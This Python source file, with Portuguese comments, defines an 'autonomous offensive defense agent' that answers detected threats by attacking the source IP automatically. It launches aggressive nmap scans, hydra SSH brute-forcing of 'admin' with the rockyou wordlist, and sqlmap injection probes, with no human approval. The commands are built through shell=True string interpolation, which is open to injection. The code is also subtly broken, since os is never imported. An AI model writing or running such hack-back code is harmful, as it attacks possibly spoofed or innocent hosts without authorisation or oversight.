import time
import threading
import subprocess
import re
from datetime import datetime
from collections import deque
import random

class AutonomousDefenseAgent:
    """
    Agente Autônomo com capacidade OFENSIVA
    - Monitora ameaças
    - Inicia contra-ataques automáticos
    - Pode executar Kali Tools ofensivamente
    """
    
    def __init__(self, defense_engine, callback=None):
        self.defense_engine = defense_engine
        self.callback = callback
        self.is_running = False
        self.threat_history = deque(maxlen=100)
        self.attack_in_progress = {}
        
        # Configuração de resposta ofensiva
        self.offensive_actions = {
            "DDoS": {
                "tools": ["nmap", "hping3"],
                "action": "port_scan",
                "severity": "critical"
            },
            "BRUTE_FORCE": {
                "tools": ["hydra"],
                "action": "reverse_brute",
                "severity": "high"
            },
            "PORT_SCAN": {
                "tools": ["nmap"],
                "action": "aggressive_scan",
                "severity": "medium"
            },
            "SQL_INJECTION": {
                "tools": ["sqlmap"],
                "action": "auto_exploit",
                "severity": "critical"
            }
        }
        
    def start(self):
        self.is_running = True
        self._log("🤖 Agente Autônomo OFENSIVO ativado", "success")
        self._log("⚔️ Modo contra-ataque com Kali Tools pronto", "info")
        self.monitor_thread = threading.Thread(target=self._monitor, daemon=True)
        self.monitor_thread.start()
    
    def stop(self):
        self.is_running = False
        self._log("🤖 Agente Autônomo desativado", "warning")
    
    def _monitor(self):
        while self.is_running:
            try:
                # Verificar ameaças recentes
                threats = self.defense_engine.get_threats()
                for threat in threats[:5]:
                    if threat.get('id') not in self.attack_in_progress:
                        self._evaluate_response(threat)
                time.sleep(3)
            except Exception as e:
                self._log(f"Erro no monitoramento: {e}", "error")
    
    def _evaluate_response(self, threat):
        """Avalia e executa resposta ofensiva"""
        threat_type = threat.get('type', 'UNKNOWN')
        attacker_ip = threat.get('source_ip', '')
        
        if not attacker_ip or attacker_ip == "desconhecido":
            return
        
        self._log(f"🎯 Avaliando resposta ofensiva para {threat_type} de {attacker_ip}", "alert")
        
        # Determinar ação baseada no tipo
        if threat_type in self.offensive_actions:
            action = self.offensive_actions[threat_type]
            self._execute_offensive(attacker_ip, threat_type, action)
            self.attack_in_progress[threat.get('id')] = time.time()
    
    def _execute_offensive(self, target_ip, threat_type, action_config):
        """Executa ação ofensiva usando Kali Tools"""
        self._log(f"⚔️ INICIANDO OFENSIVA contra {target_ip} ({threat_type})", "critical")
        
        # Registrar início do ataque
        attack_info = {
            "target": target_ip,
            "threat": threat_type,
            "action": action_config["action"],
            "timestamp": time.time(),
            "tools": []
        }
        
        # Executar ferramentas de acordo com o tipo
        if "nmap" in action_config["tools"]:
            self._run_nmap_scan(target_ip, attack_info)
        
        if "hydra" in action_config["tools"]:
            self._run_hydra_attack(target_ip, attack_info)
        
        if "sqlmap" in action_config["tools"]:
            self._run_sqlmap_scan(target_ip, attack_info)
        
        # Notificar sobre a ofensiva
        if self.callback:
            self.callback({
                "type": "offensive_action",
                "target": target_ip,
                "threat": threat_type,
                "action": action_config["action"],
                "timestamp": time.time()
            })
        
        self._log(f"✅ Ofensiva contra {target_ip} concluída", "success")
    
    def _run_nmap_scan(self, target, attack_info):
        """Executa scan agressivo com nmap"""
        try:
            self._log(f"   🔍 Executando nmap agressivo em {target}", "info")
            cmd = f"nmap -sS -sV -p- -T4 {target} --max-retries 1 --host-timeout 30s"
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=35)
            
            # Analisar portas abertas
            open_ports = re.findall(r'(\d+)/tcp\s+open', result.stdout)
            if open_ports:
                self._log(f"   🔓 Portas abertas detectadas: {', '.join(open_ports[:5])}", "info")
                attack_info["open_ports"] = open_ports[:10]
            
            return result.stdout
        except Exception as e:
            self._log(f"   ❌ Erro no nmap: {e}", "error")
            return None
    
    def _run_hydra_attack(self, target, attack_info):
        """Executa ataque de força bruta com hydra"""
        try:
            self._log(f"   💪 Executando hydra em {target}", "info")
            # Wordlist padrão do Kali
            wordlist = "/usr/share/wordlists/rockyou.txt"
            if not os.path.exists(wordlist):
                wordlist = "/usr/share/wordlists/dirb/common.txt"
            
            cmd = f"hydra -l admin -P {wordlist} ssh://{target} -t 4 -V -f -w 10"
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=20)
            return result.stdout
        except Exception as e:
            self._log(f"   ❌ Erro no hydra: {e}", "error")
            return None
    
    def _run_sqlmap_scan(self, target, attack_info):
        """Executa scan de SQL injection com sqlmap"""
        try:
            self._log(f"   💉 Executando sqlmap em {target}", "info")
            # Tentar encontrar endpoint comum
            endpoints = ["/index.php?id=1", "/page.php?id=1", "/product.php?id=1"]
            for endpoint in endpoints:
                url = f"http://{target}{endpoint}"
                cmd = f"sqlmap -u '{url}' --batch --level=1 --timeout=5"
                result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=15)
                if "vulnerable" in result.stdout.lower():
                    self._log(f"   🚨 Vulnerabilidade SQL encontrada em {endpoint}", "critical")
                    break
        except Exception as e:
            self._log(f"   ❌ Erro no sqlmap: {e}", "error")
            return None
    
    def _log(self, msg, level="info"):
        if self.callback:
            self.callback({"type": "log", "message": f"[AGENTE] {msg}", "level": level})
        print(f"[AGENTE] {msg}")
    
    def get_stats(self):
        return {
            "total_threats_analyzed": len(self.threat_history),
            "offensive_actions": len(self.attack_in_progress),
            "active_attacks": len(self.attack_in_progress),
            "uptime": time.time() - getattr(self, 'start_time', time.time())
        }
